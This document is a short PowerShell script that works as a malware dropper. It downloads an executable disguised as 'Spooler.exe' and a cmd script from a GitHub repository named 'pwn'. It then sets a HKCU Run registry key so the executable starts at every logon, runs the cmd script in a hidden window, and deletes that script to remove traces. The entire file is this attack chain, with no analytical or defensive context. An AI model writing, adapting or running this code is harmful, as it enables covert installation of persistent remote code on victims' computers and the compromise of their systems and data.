# Define the download directory and executable URL
$downloadDirectory = "$env:USERPROFILE\Library"
$exeUrl = "https://github.com/Wesley5n1p35/pwn/raw/main/Spooler.exe"

# Ensure the directory exists, or create it if it doesn't
if (-not (Test-Path -Path $downloadDirectory -PathType Container)) {
    New-Item -Path $downloadDirectory -ItemType Directory
}

# Download the executable
Invoke-WebRequest -Uri $exeUrl -OutFile "$downloadDirectory\Spooler.exe"

$cmdScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/pwn/main/play.cmd"
$cmdScriptPath = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")

# Download the .cmd script from the URL
Invoke-WebRequest -Uri $cmdScriptUrl -OutFile $cmdScriptPath

# Define the program path you want to start automatically
$programPath = "$env:USERPROFILE\Library\Spooler.exe"

# Define the registry key path
$registryKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"

# Define the name of the registry entry (without the file extension)
$entryName = "Spooler"

# Create the registry entry to run the program at startup
New-ItemProperty -Path $registryKeyPath -Name $entryName -Value $programPath -PropertyType String

# Execute the .cmd script with the window closed
Start-Process -FilePath "cmd.exe" -ArgumentList "/c $cmdScriptPath" -WindowStyle Hidden -Wait

Start-Sleep -Seconds 5

$fileName = [System.IO.Path]::Combine($env:USERPROFILE, "Library\play.cmd")

# Check if the file exists before attempting to delete it
Remove-Item $fileName -Force

